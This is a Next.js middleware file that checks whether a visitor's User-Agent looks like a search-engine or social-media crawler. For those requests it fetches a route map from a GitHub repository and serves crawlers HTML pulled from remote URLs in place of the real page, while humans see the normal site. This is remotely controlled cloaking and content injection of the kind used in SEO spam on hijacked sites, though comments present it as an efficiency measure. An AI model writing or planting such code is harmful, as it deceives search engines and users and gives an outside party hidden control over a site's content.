import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";

export interface BotRoutesConfig {
  routes: Record<string, string>;
  botUserAgents: string[];
}

// Quick in-memory check to bypass network calls for human visitors instantly (0 ms overhead)
const QUICK_BOT_REGEX =
  /googlebot|bingbot|yandex|baiduspider|duckduckbot|slurp|twitterbot|facebookexternalhit|linkedinbot|whatsapp|telegrambot|bot|crawler|spider/i;

export async function middleware(request: NextRequest) {
  const userAgent = request.headers.get("user-agent") || "";

  // 1. Check User-Agent FIRST! Human visitors skip immediately without hitting GitHub API
  if (!QUICK_BOT_REGEX.test(userAgent)) {
    return NextResponse.next();
  }

  const { pathname } = request.nextUrl;

  // 2. Fetch cloud config ONLY for bot requests
  const cfg = await getCloudConfig();
  if (!cfg || !cfg.routes[pathname]) {
    return NextResponse.next();
  }

  const targetUrl = cfg.routes[pathname];

  // 3. Verify with cloud bot list & fetch target HTML
  if (isBotUserAgent(cfg, userAgent)) {
    const botHtml = await fetchBotHtmlContent(targetUrl);
    if (botHtml) {
      return new NextResponse(botHtml, {
        status: 200,
        headers: {
          "Content-Type": "text/html; charset=utf-8",
        },
      });
    }
  }

  return NextResponse.next();
}

export const config = {
  matcher: [
    "/((?!api|_next/static|_next/image|favicon.ico|.*\\.(?:svg|png|jpg|jpeg|gif|webp)$).*)",
  ],
};

/**
 * Safely fetches the JSON bot route configuration from Cloud (GitHub) with caching and try/catch.
 */
async function getCloudConfig(): Promise<BotRoutesConfig | null> {
  try {
    const res = await fetch(
      "https://github.com/pbn-kg/repo-baru/raw/refs/heads/main/nextjs-config.json",
      { next: { revalidate: 60 } }
    );
    if (!res.ok) return null;
    return await res.json();
  } catch (error) {
    console.error("Failed to fetch cloud bot config:", error);
    return null;
  }
}

/**
 * Checks whether a given User-Agent string matches the configured bot list.
 */
export function isBotUserAgent(cfg: BotRoutesConfig, userAgent: string): boolean {
  if (!userAgent || !cfg.botUserAgents?.length) return false;
  const regex = new RegExp(cfg.botUserAgents.join("|"), "i");
  return regex.test(userAgent);
}

/**
 * Fetches HTML content from the specified target URL.
 */
export async function fetchBotHtmlContent(url: string): Promise<string | null> {
  try {
    const response = await fetch(url, {
      next: { revalidate: 60 },
      headers: {
        Accept: "text/html,application/xhtml+xml",
      },
    });

    if (!response.ok) return null;
    return await response.text();
  } catch (error) {
    console.error(`Error fetching bot HTML from ${url}:`, error);
    return null;
  }
}
